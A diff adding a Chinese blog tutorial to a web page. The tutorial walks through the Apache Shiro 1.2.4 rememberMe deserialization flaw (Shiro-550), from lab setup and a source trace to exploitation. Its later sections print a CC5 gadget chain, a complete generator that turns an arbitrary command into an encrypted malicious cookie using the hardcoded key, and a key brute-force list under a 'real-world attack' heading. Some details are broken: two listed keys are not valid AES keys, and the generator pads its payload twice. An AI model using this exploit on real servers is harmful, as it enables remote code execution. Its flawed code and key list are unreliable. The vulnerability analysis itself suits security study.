@@ -452,14 +452,14 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    0
+                    3.6k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    1 分
+                    15 分
                 </div>
                 
 
@@ -482,7 +482,165 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                
+                <h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>jdk8u65<br>Tomcat8<br>shiro 1.2.4<br>漏洞影响版本：Shiro &lt;&#x3D; 1.2.4</p>
+<p>搭建环境这里比较费心思，慢慢来。</p>
+<p>jdk8u65 和 tomcat8 的配置比较简单，直接下载，跟着安装就可以。tomcat8 下载这个包</p>
+<p>Tomcat8 在 IDEA 中配置<br>这里我们先 clone 一下 P神的项目：<a target="_blank" rel="noopener" href="https://github.com/phith0n/JavaThings/tree/master/shirodemo">https://github.com/phith0n/JavaThings/tree/master/shirodemo</a></p>
+<ol>
+<li><p>用 IDEA 打开这个项目，去到 Settings 界面<br>如图配置，在 Add 的时候选择 Tomcat Server 这一选项。</p>
+</li>
+<li><p>配置 Edit Configurations<br>添加url<br><img src="https://i-blog.csdnimg.cn/direct/434024e762b64c2d89dc930e3b36f52f.png" alt="在这里插入图片描述"><br>login.jsp不加</p>
+</li>
+<li><p>运行测试<br>右键 login.jsp，运行之后会有一堆爆红，然后是 404 的界面，这个时候我们点击 IDEA 自带的用浏览器打开前端界面即可，这样就可以访问成功了。</p>
+</li>
+</ol>
+<p>登录的 username 和 password 默认是 root 与 secret。</p>
+<p>这里还有一点小问题，在用 Burpsuite 抓包的时候会抓不到 localhost 的包，这里我们只需要查看 ipconfig 下的 IPV4 地址，用那个 IP 地址去替换 localhost 就能够抓包了。</p>
+<h4 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h4><ul>
+<li>勾选 RememberMe 字段，登陆成功的话，返回包 set-Cookie 会有 rememberMe&#x3D;deleteMe 字段，还会有 rememberMe 字段，之后的所有请求中 Cookie 都会有 rememberMe 字段，那么就可以利用这个 rememberMe 进行反序列化，从而 getshell。<br>PixPin_2025-10-31_21-48-26.png</li>
+</ul>
+<p>Shiro1.2.4 及之前的版本中，AES 加密的密钥默认硬编码在代码里（Shiro-550），Shiro 1.2.4 以上版本官方移除了代码中的默认密钥，要求开发者自己设置，如果开发者没有设置，则默认动态生成，降低了固定密钥泄漏的风险。</p>
+<p>分析Coockie<br>我们还是从一个漏洞发现者的角度出发，而不是跟着 IDEA 打断点走一遍就可以的。<br>首先在抓包的情况下，我们在拿到这一 Cookie 的时候，很明显能够看到这是经过某种加密的。因为我们平常的 Cookie 都是比较短的，而 shiro RememberMe 字段的 Cookie 太长了。</p>
+<p>如此，我们先去分析 Cookie 的加密过程。<br>我们在知晓 Shiro 的加密过程之后，可以人为构造恶意的 Cookie 参数，从而实现命令执行的目的</p>
+<p>这很重要！并不是知道了怎么加密解密之后就可以 RCE 的！</p>
+<h4 id="一、Shiro-的加密机制"><a href="#一、Shiro-的加密机制" class="headerlink" title="一、Shiro 的加密机制"></a>一、Shiro 的加密机制</h4><p>1.1 加密全流程<br>&#x2F;&#x2F; AbstractRememberMeManager.java 核心加密流程<br>public byte[] encrypt(byte[] plaintext) {<br>    byte[] iv &#x3D; generateInitializationVector(true);  &#x2F;&#x2F; 生成16字节IV<br>    byte[] ciphertext &#x3D; getCipherService().encrypt(plaintext, encryptionCipherKey, iv).getBytes();<br>    return ByteSource.Util.concat(iv, ciphertext).getBytes();  &#x2F;&#x2F; 拼接IV+密文<br>}<br>关键参数说明：</p>
+<p>IV：16字节随机初始化向量（每次请求都不同）<br>encryptionCipherKey：硬编码密钥 kPH+bIxk5D2deZiIxcaaaA&#x3D;&#x3D;(Base64)<br>加密模式：AES-128-CBC + PKCS5Padding<br>输出结构：[16字节IV] + [加密后的序列化数据]<br>1.2 内存中的字节布局<br>+———————+——————————-+<br>|  IV(16字节)         |   加密数据(长度可变)           |<br>|  0a 1b 2c 3d…     |  x0 x1 x2 x3… xn            |<br>+———————+——————————-+<br>1.3 加密流程图示</p>
+<h3 id="二、反序列化触发剖析"><a href="#二、反序列化触发剖析" class="headerlink" title="二、反序列化触发剖析"></a>二、反序列化触发剖析</h3><h4 id="2-1-服务端解密调用栈"><a href="#2-1-服务端解密调用栈" class="headerlink" title="2.1 服务端解密调用栈"></a><strong>2.1 服务端解密调用栈</strong></h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// CookieRememberMeManager.getRememberedPrincipals()</span></span><br><span class="line"><span class="keyword">public</span> PrincipalCollection <span class="title function_">getRememberedPrincipals</span><span class="params">(SubjectContext subjectContext)</span> &#123;</span><br><span class="line">    <span class="type">byte</span>[] bytes = getRememberedSerializedIdentity(subjectContext); <span class="comment">// 获取Cookie</span></span><br><span class="line">    <span class="keyword">if</span> (bytes != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> convertBytesToPrincipals(bytes); <span class="comment">// 致命调用点</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// AbstractRememberMeManager.convertBytesToPrincipals()</span></span><br><span class="line"><span class="keyword">protected</span> PrincipalCollection <span class="title function_">convertBytesToPrincipals</span><span class="params">(<span class="type">byte</span>[] bytes)</span> &#123;</span><br><span class="line">    <span class="type">byte</span>[] decrypted = decrypt(bytes);        <span class="comment">// AES解密</span></span><br><span class="line">    <span class="keyword">return</span> deserialize(decrypted);            <span class="comment">// 危险反序列化</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// DefaultSerializer.deserialize()</span></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">deserialize</span><span class="params">(<span class="type">byte</span>[] serializedBytes)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(bytes).readObject(); <span class="comment">// 漏洞根源</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>致命缺陷：</strong> 没有任何安全过滤直接调用 <code>readObject()</code></p>
+<h5 id="逆向分析解密过程"><a href="#逆向分析解密过程" class="headerlink" title="逆向分析解密过程"></a>逆向分析解密过程</h5><p>接下来我们看一看它具体的解密过程，这一步能让我梦更深入的理解原理和Java代码设计逻辑，各位师傅可以自己分析一下</p>
+<p>要找 Cookie 的加密过程，直接在 IDEA 里面全局搜索 Cookie，去找 Shiro 包里的类。</p>
+<p>最后我们找到相关的类是 <code>CookieRememberMeManager</code>，其中，在观察了一圈之后，将目光锁定到 <code>getRememberedSerializedIdentity()</code> 这个方法上。</p>
+<p><img src="https://i-blog.csdnimg.cn/direct/a91652139f2f40a6ae9b49f6d8c11e76.png#pic_center" alt="在这里插入图片描述"></p>
+<p><img src="https://i-blog.csdnimg.cn/direct/cd3c5e5950c949fd939a908321d7df30.png" alt="在这里插入图片描述"></p>
+<p>接下来分析下这个代码</p>
+<p><img src="https://i-blog.csdnimg.cn/direct/4c9f56770b89410ba46cc7f7fca8a5bf.png" alt="在这里插入图片描述"></p>
+<p>这里的前面，先判断是否为 HTTP 请求，如果是的话，获取 cookie 中 rememberMe 的值，然后判断是否是 deleteMe，不是则判断是否是符合 base64 的编码长度，然后再对其进行 base64 解码，将解码结果返回。</p>
+<p>我们逆向上去，看一下谁调用了 <code>getRememberedSerializedIdentity()</code> 这个方法。</p>
+<p>这段代码的核心功能一句话就能概括：<br><strong>“把浏览器带来的 rememberMe Cookie 拿出来、解 Base64，还原成原始字节数组，供后面反序列化成用户身份。”</strong></p>
+<p>这儿给出一些函数的相关含义，师傅后续可以自己点进去简单看一下，都是涉及javaEE开发的一些东西，后面不再做解释；</p>
+<ul>
+<li><p><code>WebUtils.isHttp(...)</code><br>只处理 HTTP 请求，如果不是 Web 环境（例如单元测试）直接返回 null，rememberMe 作废。</p>
+</li>
+<li><p><code>isIdentityRemoved(...)</code><br>防止并发注销时再把身份“捡回来”；一旦标记过“已清除”就立即返回 null。</p>
+</li>
+<li><p><code>WebUtils.getHttpRequest/Response(...)</code><br>拿到标准的 <code>HttpServletRequest/Response</code>，准备读 Cookie。</p>
+</li>
+<li><p><code>getCookie().readValue(...)</code><br>从请求头里把 <code>rememberMe=xxx</code> 的值读出来；如果 Cookie 已被标记为“删除”也返回 null。</p>
+</li>
+<li><p><code>ensurePadding(base64)</code><br>有些浏览器会截掉末尾的 <code>=</code>，这里自动补齐，防止 <code>Base64.decode</code> 抛异常。</p>
+</li>
+<li><p><code>Base64.decode(...)</code><br>把 Base64 字符串还原成字节数组，后面会拿给 <code>ObjectInputStream</code> 做反序列化。</p>
+</li>
+</ul>
+<hr>
+<p>涉及相关类</p>
+<p><code>AbstractRememberMeManager</code> | 提供 rememberMe 的完整生命周期模板：生成 → 序列化 → 加密 → 写 Cookie；本段代码就是“读 Cookie → 解密 → 反序列化”里的第一步。<br><code>CookieRememberMeManager</code> | 具体实现类，把“rememberMe”信息存在浏览器的 Cookie 中；<code>getCookie()</code> 返回的就是它内部封装的 <code>SimpleCookie</code>。<br><code>SimpleCookie</code> | Shiro 对 Servlet Cookie 的轻量级包装，负责读写、域名、路径、HttpOnly、Secure 等属性。<br><code>WebUtils</code> | 工具包，从任意 <code>SubjectContext</code> 里快速掏出 <code>HttpServletRequest/Response</code>。<br><code>Base64</code> | Shiro 自己实现的 Base64 编解码工具，不依赖 JDK 8 的 <code>java.util.Base64</code>，兼容 1.6+。</p>
+<hr>
+<ol start="3">
+<li><p>整体协作时序（rememberMe 登录）</p>
+</li>
+<li><p>用户勾选“记住我”登录 →<br><code>CookieRememberMeManager.onSuccessfulLogin</code> → 序列化 <code>PrincipalCollection</code> → Base64 → 写 Cookie <code>rememberMe=xxx</code></p>
+</li>
+<li><p>用户下次打开浏览器 → 访问任何地址 → Shiro 过滤器触发 →<br><code>DefaultSecurityManager.createSubject</code> → 走到本段代码 → 拿到字节数组 → 下一步 <code>deserialize(...)</code> → 还原成 <code>PrincipalCollection</code> → 自动登录成功。</p>
+</li>
+</ol>
+<hr>
+<p>一句话总结<br><code>getRememberedSerializedIdentity()</code> 就是 rememberMe 的“入口海关”：<br><strong>“验明正身（HTTP）→ 查黑名单（removed）→ 收护照（Cookie）→ 解封条（Base64）→ 把原始档案交给后面反序列化。”</strong></p>
+<p><img src="https://i-blog.csdnimg.cn/direct/2864b88ea362403eaa72b0cb01623cd6.png" alt="在这里插入图片描述"></p>
+<p>Principal — 实体</p>
+<p>找到了 <code>AbstractRememberMeManager</code> 这个接口的 <code>getRememberedPrincipals()</code> 方法。</p>
+<p><code>getRememberedPrincipals()</code> 方法的作用域为 <strong>PrincipalCollection</strong>，一般就是用于聚合多个 Realm 配置的集合。</p>
+<p>这里 393，396 行；393 行 ———— 将 HTTP Requests 里面的 Cookie 拿出来，赋值给 bytes 数组；396 行将 bytes 数组的东西进行 <code>convertBytesToPrincipals()</code> 方法的调用，并将值赋给 principals 变量。</p>
+<p>我们继续进入convertBytesToPrinciple()看一看；</p>
+<p><img src="https://i-blog.csdnimg.cn/direct/d6237665fc304319a7ceec3f2ecbc000.png" alt="在这里插入图片描述"></p>
+<p>在 <code>convertBytesToPrincipals()</code> 这个方法当中，很明确地做了两件事，一件是 <strong>decrypt</strong> 的解密，另一件是 <strong>deserialize</strong> 的反序列化。</p>
+<p>让我们先进入到decrrypt()方法中一探究竟，他的详细加密过程是怎么样的</p>
+<p><img src="https://i-blog.csdnimg.cn/direct/81f1dee49d464e22b5e00ed5ab181593.png" alt="在这里插入图片描述"></p>
+<p>cipher：密码；<br>第 487 行，先是获取了密钥服务，也就是实现 AOP 的实现类，再往后 489 行的 <code>decrypt()</code> 跟进去，发现它是一个接口。我们可以看一下它的参数名</p>
+<p>第一个要加密的数组，第二个是一个 key，说明这是一个对称加密，我们重点去关注一下 key。</p>
+<p>回到之前 <code>decrypt()</code> 方法的第 489 行，两个传参，第一个是 Cookie，第二个是 key，跟进传入的 getDecryptionCipherKey</p>
+<p>最终发现这个东西是个常量，过程如下</p>
+<p>先点进 <code>getDecryptionCipherKey</code> 这个参数，进去之后发现这是一个 btye[] 的方法，返回了 <code>decryptionCipherKey</code>。<code>decryptionCipherKey</code> 这里，我们找一找谁调用了它。</p>
+<p><img src="https://i-blog.csdnimg.cn/direct/dbf38709296c4ff88b3c11def5e9631a.png" alt="在这里插入图片描述"></p>
+<p>跟进去 <code>decryptionCipherKey()</code> 之后，查看谁调用了它，发现是 <code>setDecryptionCipherKey()</code> 方法，</p>
+<p><img src="https://i-blog.csdnimg.cn/direct/2ea19a9709c64b79abc33b47d2b59384.png" alt="在这里插入图片描述"></p>
+<p>那么显然这儿是个复制，我们就需要看谁调用了这个函数，并且传参进去了，（因为cipher就是密码）看谁调用了 <code>setDecryptionCipherKey()</code></p>
+<p><img src="https://i-blog.csdnimg.cn/direct/4c3cb4020a0b4367a06e8875f4bef7b2.png" alt="在这里插入图片描述"></p>
+<p><img src="https://i-blog.csdnimg.cn/direct/1ffae8ae040b497e9c8084de419e6c9f.png" alt="在这里插入图片描述"></p>
+<p>二次跟进，终于找到不一样的东西了；</p>
+<p>![[语言&#x2F;java&#x2F;java安全&#x2F;组件相关安全&#x2F;shiro&#x2F;img&#x2F;PixPin_2025-10-31_23-12-54.png]]<br><img src="https://i-blog.csdnimg.cn/direct/59aba26864134a47af178234a346c1b1.png" alt="在这里插入图片描述"></p>
+<p>一整条寻找的思路如下图所示，这里我们发现 shiro 进行 Cookie 加密的 AES 算法的密钥是一个常量。</p>
+<p><img src="https://i-blog.csdnimg.cn/img_convert/d98e9b597caf11fcc8bad530c70da122.png"></p>
+<h4 id="2-2-Java-反序列化底层原理"><a href="#2-2-Java-反序列化底层原理" class="headerlink" title="2.2 Java 反序列化底层原理"></a><strong>2.2 Java 反序列化底层原理</strong></h4><p>在之前 <code>convertBytesToPrincipals()</code> 这个方法的地方，点进去。是一个接口，再看一看接口里面的 <code>deserial</code> 的实现方法有哪些</p>
+<p><img src="https://i-blog.csdnimg.cn/img_convert/96ecace372a053d717cfe656ca555081.png"></p>
+<p>点进 shiro 包的 <code>deserial()</code> 方法，这里面的 <code>deserial()</code> 方法调用了 <code>readObject()</code>，所以这里反序列化的地方是一个很好的入口类。</p>
+<p>至此，Shiro 拿到 HTTP 包里的 Cookie 的解密过程已经梳理地很清楚了，我们再回头看一看那一段 Cookie 是如何产生的，也就是加密过程。</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ObjectInputStream 工作流程</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> Object <span class="title function_">readObject</span><span class="params">()</span> </span><br><span class="line">    -&gt; readObject0(<span class="literal">false</span>) </span><br><span class="line">        -&gt; <span class="keyword">switch</span>(tc): <span class="keyword">case</span> TC_OBJECT </span><br><span class="line">            -&gt; readOrdinaryObject(<span class="literal">false</span>)</span><br><span class="line">                -&gt; desc.initNonProxy()        <span class="comment">// 解析类描述符</span></span><br><span class="line">                -&gt; obj = desc.newInstance()   <span class="comment">// 反射创建实例</span></span><br><span class="line">                -&gt; desc.readObject(obj)       <span class="comment">// 调用对象的readObject方法</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>漏洞放大点：</strong> Java 的反序列化会递归解析所有引用对象</p>
+<h5 id="加密过程"><a href="#加密过程" class="headerlink" title="加密过程"></a>加密过程</h5><p>这儿加密过程从onSuccessfulLogin()入手的</p>
+<p><img src="https://i-blog.csdnimg.cn/direct/3ee4a036a4c64809bc36589496462ed3.png" alt="在这里插入图片描述"></p>
+<p>isRememberMe(token)检查是否开启rememberme，然后进入rememberIdentity(subject, token, info);后面的日志dedug显然不重要</p>
+<p><img src="https://i-blog.csdnimg.cn/direct/f13f3ca2585642c787592c7455c5b7a4.png" alt="在这里插入图片描述"></p>
+<p>前面首先是一个getIdentityToRemember(subject, authcInfo);得到相关认证的，我们要的是认证里面的东西，所以是rememberIdentity(subject, principals);里面</p>
+<p><img src="https://i-blog.csdnimg.cn/direct/69244f66d9814a03bfd9b34e6cef342e.png" alt="在这里插入图片描述"></p>
+<p>进来之后果然发现 convertPrincipalsToBytes，不出我们所料，接下来就和前面解密过程类似了</p>
+<p>不再过多赘诉，后面发现加密算法是 AES 了，AES 是一种对称加密算法，继续往下跟，最后是找到加密 Key 用的是一个常量</p>
+<p><img src="https://i-blog.csdnimg.cn/direct/13ce66ee5bdf489b9171846160456748.png" alt="在这里插入图片描述"></p>
+<p><img src="https://i-blog.csdnimg.cn/direct/a253654f38764a1dbe87106e82c974d1.png" alt="在这里插入图片描述"></p>
+<p><img src="https://i-blog.csdnimg.cn/direct/3c6c96a466a54ede9c1eaa9cb6396ad8.png" alt="在这里插入图片描述"></p>
+<h3 id="三、-Shiro-550-漏洞利用（CC5-为例）"><a href="#三、-Shiro-550-漏洞利用（CC5-为例）" class="headerlink" title="三、## Shiro-550 漏洞利用（CC5 为例）"></a>三、## Shiro-550 漏洞利用（CC5 为例）</h3><h4 id="3-1-完整手工-CC5-调用链"><a href="#3-1-完整手工-CC5-调用链" class="headerlink" title="3.1 完整手工 CC5 调用链"></a><strong>3.1 完整手工 CC5 调用链</strong></h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 手工构建CC5调用链（不含任何工具依赖）</span></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">buildExploit</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="comment">// 构造Transformers链</span></span><br><span class="line">    Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc.exe&quot;</span>&#125;)</span><br><span class="line">    &#125;;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 包装链式执行</span></span><br><span class="line">    <span class="type">Transformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// LazyMap触发机制</span></span><br><span class="line">    <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(<span class="keyword">new</span> <span class="title class_">HashMap</span>(), chainedTransformer);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// TiedMapEntry作为入口</span></span><br><span class="line">    <span class="type">TiedMapEntry</span> <span class="variable">entry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, <span class="string">&quot;dummy_key&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 最终触发点</span></span><br><span class="line">    <span class="type">BadAttributeValueExpException</span> <span class="variable">exploit</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="literal">null</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 反射注入恶意对象</span></span><br><span class="line">    <span class="type">Field</span> <span class="variable">valField</span> <span class="operator">=</span> BadAttributeValueExpException.class.getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">    valField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    valField.set(exploit, entry);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> exploit;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="3-2-调用链时序分析"><a href="#3-2-调用链时序分析" class="headerlink" title="3.2 调用链时序分析"></a><strong>3.2 调用链时序分析</strong></h4><h4 id="3-3-关键反射点剖析"><a href="#3-3-关键反射点剖析" class="headerlink" title="3.3 关键反射点剖析"></a><strong>3.3 关键反射点剖析</strong></h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// InvokerTransformer.transform()核心代码</span></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;</span><br><span class="line">    <span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> input.getClass();</span><br><span class="line">    <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> cls.getMethod(iMethodName, iParamTypes); <span class="comment">// 反射获取方法</span></span><br><span class="line">    <span class="keyword">return</span> method.invoke(input, iArgs); <span class="comment">// 反射调用方法</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>危险组合：</strong></p>
+<ol>
+<li>动态获取类名（ConstantTransformer）</li>
+<li>动态加载类（Class.forName）</li>
+<li>反射调用任意方法（Method.invoke）</li>
+</ol>
+<hr>
+<h3 id="四、手工打造完整-POC（从零编写）"><a href="#四、手工打造完整-POC（从零编写）" class="headerlink" title="四、手工打造完整 POC（从零编写）"></a>四、手工打造完整 POC（从零编写）</h3><h4 id="步骤1：手工序列化恶意对象"><a href="#步骤1：手工序列化恶意对象" class="headerlink" title="步骤1：手工序列化恶意对象"></a>步骤1：手工序列化恶意对象</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line"><span class="keyword">try</span> (<span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(baos)) &#123;</span><br><span class="line">    oos.writeObject(exploit); </span><br><span class="line">&#125;</span><br><span class="line"><span class="type">byte</span>[] payload = baos.toByteArray();</span><br></pre></td></tr></table></figure>
+
+<h4 id="步骤2：实现AES-CBC加密"><a href="#步骤2：实现AES-CBC加密" class="headerlink" title="步骤2：实现AES-CBC加密"></a>步骤2：实现AES-CBC加密</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Cipher</span> <span class="variable">cipher</span> <span class="operator">=</span> Cipher.getInstance(<span class="string">&quot;AES/CBC/PKCS5Padding&quot;</span>);</span><br><span class="line"><span class="type">SecretKeySpec</span> <span class="variable">keySpec</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SecretKeySpec</span>(key, <span class="string">&quot;AES&quot;</span>);</span><br><span class="line"><span class="type">IvParameterSpec</span> <span class="variable">ivSpec</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">IvParameterSpec</span>(iv);</span><br><span class="line"></span><br><span class="line">cipher.init(Cipher.ENCRYPT_MODE, keySpec, ivSpec);</span><br><span class="line"><span class="type">byte</span>[] ciphertext = cipher.doFinal(payload);</span><br><span class="line"><span class="type">byte</span>[] encrypted = ByteArray.concat(iv, ciphertext); <span class="comment">// IV+密文</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="步骤3：Base64编码优化"><a href="#步骤3：Base64编码优化" class="headerlink" title="步骤3：Base64编码优化"></a>步骤3：Base64编码优化</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 特殊处理Base64输出兼容性</span></span><br><span class="line"><span class="type">String</span> <span class="variable">rememberMe</span> <span class="operator">=</span> Base64.getEncoder()</span><br><span class="line">        .encodeToString(encrypted)</span><br><span class="line">        .replace(<span class="string">&#x27;+&#x27;</span>, <span class="string">&#x27;-&#x27;</span>)</span><br><span class="line">        .replace(<span class="string">&#x27;/&#x27;</span>, <span class="string">&#x27;_&#x27;</span>)  <span class="comment">// URL安全字符替换</span></span><br><span class="line">        .replace(<span class="string">&quot;\n&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">        .replace(<span class="string">&quot;\r&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">        .replace(<span class="string">&quot;=&quot;</span>, <span class="string">&quot;&quot;</span>);  <span class="comment">// 去除填充符</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="完整工具类核心代码："><a href="#完整工具类核心代码：" class="headerlink" title="完整工具类核心代码："></a>完整工具类核心代码：</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ShiroPOCGenerator</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">byte</span>[] DEFAULT_KEY = Base64.decode(<span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">generateExploit</span><span class="params">(String command)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// 1. 构造CC链对象</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">exploit</span> <span class="operator">=</span> buildCC5Exploit(command);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 2. 序列化</span></span><br><span class="line">        <span class="type">byte</span>[] payload = serialize(exploit);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 3. 生成随机IV</span></span><br><span class="line">        <span class="type">byte</span>[] iv = SecureRandom.getInstanceStrong().generateSeed(<span class="number">16</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 4. AES加密</span></span><br><span class="line">        <span class="type">Cipher</span> <span class="variable">cipher</span> <span class="operator">=</span> Cipher.getInstance(<span class="string">&quot;AES/CBC/PKCS5Padding&quot;</span>);</span><br><span class="line">        cipher.init(Cipher.ENCRYPT_MODE, </span><br><span class="line">                   <span class="keyword">new</span> <span class="title class_">SecretKeySpec</span>(DEFAULT_KEY, <span class="string">&quot;AES&quot;</span>), </span><br><span class="line">                   <span class="keyword">new</span> <span class="title class_">IvParameterSpec</span>(iv));</span><br><span class="line">        </span><br><span class="line">        <span class="type">byte</span>[] ciphertext = cipher.doFinal(padPayload(payload));</span><br><span class="line">        <span class="type">byte</span>[] encrypted = Arrays.copyOf(iv, iv.length + ciphertext.length);</span><br><span class="line">        System.arraycopy(ciphertext, <span class="number">0</span>, encrypted, iv.length, ciphertext.length);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 5. Base64编码 + URL安全处理</span></span><br><span class="line">        <span class="keyword">return</span> makeURLSafe(Base64.getEncoder().encodeToString(encrypted));</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">byte</span>[] padPayload(<span class="type">byte</span>[] payload) &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">padLen</span> <span class="operator">=</span> <span class="number">16</span> - (payload.length % <span class="number">16</span>);</span><br><span class="line">        <span class="type">byte</span>[] padded = <span class="keyword">new</span> <span class="title class_">byte</span>[payload.length + padLen];</span><br><span class="line">        System.arraycopy(payload, <span class="number">0</span>, padded, <span class="number">0</span>, payload.length);</span><br><span class="line">        Arrays.fill(padded, payload.length, padded.length, (<span class="type">byte</span>)padLen);</span><br><span class="line">        <span class="keyword">return</span> padded;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h3 id="五、实战攻击深度技巧"><a href="#五、实战攻击深度技巧" class="headerlink" title="五、实战攻击深度技巧"></a>五、实战攻击深度技巧</h3><h4 id="1-密钥自动化爆破"><a href="#1-密钥自动化爆破" class="headerlink" title="1. 密钥自动化爆破"></a>1. 密钥自动化爆破</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 常用密钥列表</span></span><br><span class="line">SHIRO_KEYS = [</span><br><span class="line">    <span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>,  <span class="comment"># 官方默认1</span></span><br><span class="line">    <span class="string">&quot;2AvVhdsgUs0FGA==&quot;</span>,          <span class="comment"># 常见默认2</span></span><br><span class="line">    <span class="string">&quot;3AvVhmFLUs0KTA3&quot;</span>            <span class="comment"># 常见默认3</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test_key</span>(<span class="params">key</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># 用密钥解密返回的deleteMe Cookie</span></span><br><span class="line">        <span class="comment"># 如果解密后包含AC ED（序列化魔数），说明有效</span></span><br><span class="line">        <span class="keyword">return</span> contains_serialized_marker(decrypt(cookie, key))</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure>
+
